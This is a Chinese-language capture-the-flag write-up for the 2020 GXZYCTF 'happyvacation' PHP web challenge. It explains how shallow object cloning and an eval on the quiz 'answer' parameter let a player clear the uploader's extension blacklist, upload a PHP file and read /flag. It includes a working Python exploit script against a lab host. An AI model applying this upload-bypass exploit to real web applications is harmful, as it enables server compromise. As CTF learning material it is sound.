```

title: 2020 GXZYCTF happyvacation
date: 2020-03-09 09:52:20
tags:
- Web_git泄露
- Web_PHP代码审计
categories:
- Web
- PHP
top: 
```

# one

![1584757078800](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584757078800.png)

得到源码，突破点为：

![1584757117018](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584757117018.png)

clone的复制是浅复制

![1584757135276](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584757135276.png)

也就是我们可以覆盖这个类中的一些元素, 那么看一下这个`$user`怎么传

![1584757155282](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584757155282.png)

 我们既然可以覆盖元素, 那么比如

![1584757206179](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584757206179.png)

EXP

```
import requests
import re

url = "http://192.168.2.106:4000/"
sess = requests.Session()

def login():
    sess.get(url)
    data = {
        "username": "cjm00n"
    }
    sess.post(url, data=data)
def cover(user):
    params = {
        "answer": user
    }
    resp = sess.get(f"{url}quiz.php", params=params).text
    print(resp)
def upload():
    files = [
        ("file", ("1.php", open("1.php").read()))
    ]
    resp = sess.post(f"{url}customlize.php?refer=index", files=files).text
    print(resp)

def exp():
    login()
    cover("user->uploader->black_list")
    upload()

if __name__ == "__main__":
    exp()

```

![1584757307294](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584757307294.png)

# two

审计代码发现答题的地方有个eval，answer参数有几个过滤，不能直接命令注入

![1584758165070](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584758165070.png)

但是看到this->user引入了上一层的$user，想到另外还有个上传点，于是构造

![1584758195724](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584758195724.png)

把uploader中的上传后缀黑名单清除，就能上传php文件了

![1584758223733](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584758223733.png)

![1584758242020](C:\Users\hazel_nut\Desktop\WEB第三行\2020_GXZCTF_happyvacation\happyvacation\1584758242020.png)

最后直接读取/flag